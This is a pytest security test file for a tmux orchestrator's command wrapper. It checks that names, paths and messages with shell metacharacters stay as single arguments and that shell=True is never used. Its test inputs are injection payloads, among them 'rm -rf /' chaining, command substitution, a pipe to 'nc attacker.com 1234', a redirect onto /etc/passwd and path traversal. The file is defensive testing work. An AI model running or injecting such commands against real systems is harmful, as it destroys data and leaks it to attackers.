#!/usr/bin/env python3
"""Security tests for command injection vulnerabilities and their fixes."""

from unittest.mock import MagicMock, patch

import pytest

from tmux_orchestrator.utils.tmux import TMUXManager


class TestCommandInjectionSecurity:
    """Test security fixes for command injection vulnerabilities."""

    def test_tmux_session_name_sanitization(self):
        """Test that session names with special characters are properly sanitized."""
        tmux = TMUXManager()

        # Test cases with potentially dangerous characters
        dangerous_inputs = [
            "test; rm -rf /",  # Command chaining
            "test`whoami`",  # Command substitution
            "test$(id)",  # Command substitution
            "test && echo evil",  # AND operator
            "test | nc attacker.com 1234",  # Pipe
            "test > /etc/passwd",  # Redirect
            "test' OR DROP TABLE users; --",  # SQL injection style
            'test"; /bin/sh; echo "',  # Shell escape
        ]

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)

            for dangerous_input in dangerous_inputs:
                # Test has_session
                tmux.has_session(dangerous_input)

                # Verify that the dangerous input is passed as a single, safe argument
                args_called = mock_run.call_args[0][0]

                # The dangerous input should be in the args but properly contained
                assert dangerous_input in args_called

                # Should not contain dangerous shell characters in separate elements
                assert not any(";" in str(arg) and arg != dangerous_input for arg in args_called)

    def test_tmux_directory_path_sanitization(self):
        """Test that directory paths are properly sanitized."""
        tmux = TMUXManager()

        # Test dangerous directory paths
        dangerous_paths = [
            "/tmp; rm -rf /",
            "../../../etc/passwd",
            "/tmp && evil_command",
            "/path/with spaces; evil",
        ]

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)

            for dangerous_path in dangerous_paths:
                tmux.create_session("test-session", "window", dangerous_path)

                # Verify the path is contained as a single argument
                args_called = mock_run.call_args[0][0]
                assert dangerous_path in args_called

    def test_tmux_window_name_sanitization(self):
        """Test that window names with special characters are properly sanitized."""
        tmux = TMUXManager()

        dangerous_names = [
            "window; evil_cmd",
            "window`whoami`",
            "window$(id)",
        ]

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)

            for dangerous_name in dangerous_names:
                tmux.create_session("test-session", dangerous_name)

                args_called = mock_run.call_args[0][0]
                assert dangerous_name in args_called

    def test_tmux_message_content_sanitization(self):
        """Test that message content is properly sanitized."""
        tmux = TMUXManager()

        dangerous_messages = [
            "Hello; rm -rf /",
            "Message`evil`",
            "Text && dangerous_cmd",
            "Normal message with 'quotes'",
            'Message with "double quotes"',
        ]

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)

            for dangerous_message in dangerous_messages:
                tmux.send_keys("session:0", dangerous_message)

                args_called = mock_run.call_args[0][0]
                assert dangerous_message in args_called

    def test_subprocess_never_uses_shell_true(self):
        """Ensure subprocess.run never uses shell=True."""
        tmux = TMUXManager()

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)

            # Test various methods
            tmux.has_session("test")
            tmux.create_session("test", "window")
            tmux.send_keys("test:0", "message")
            tmux.capture_pane("test:0")

            # Verify shell=True is never used
            for call in mock_run.call_args_list:
                kwargs = call[1]
                assert kwargs.get("shell") is not True
                assert "shell" not in kwargs or kwargs["shell"] is False

    def test_input_validation_prevents_empty_commands(self):
        """Test that empty or None inputs are properly handled."""
        tmux = TMUXManager()

        # Test with empty strings
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)

            # These should not cause subprocess to be called with empty args
            tmux.has_session("")

            # Should still call subprocess, but with empty string as argument
            assert mock_run.called

    def test_special_tmux_characters_are_handled(self):
        """Test that tmux-specific special characters are properly handled."""
        tmux = TMUXManager()

        # Characters that have special meaning in tmux
        tmux_special = [
            "session:window",  # Valid tmux target format
            "session.window",  # Alternative format
            "session-with-dashes",
            "session_with_underscores",
            "session@with@at@signs",
        ]

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)

            for special_name in tmux_special:
                tmux.has_session(special_name)

                args_called = mock_run.call_args[0][0]
                assert special_name in args_called


class TestSecurityFixImplementation:
    """Test that security fixes are properly implemented."""

    @pytest.mark.xfail(reason="Testing implementation details - shlex is imported but not exposed as module attribute")
    def test_shlex_quote_is_imported_and_used(self):
        """Verify that shlex.quote is imported and used for sanitization."""
        # This will be implemented as part of the fix
        import tmux_orchestrator.utils.tmux as tmux_module

        # Check that shlex is imported
        assert hasattr(tmux_module, "shlex")

    def test_input_sanitization_function_exists(self):
        """Test that input sanitization function exists."""
        tmux = TMUXManager()

        # Should have a sanitization method (will be implemented)
        assert hasattr(tmux, "_sanitize_input") or hasattr(tmux, "_validate_input")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
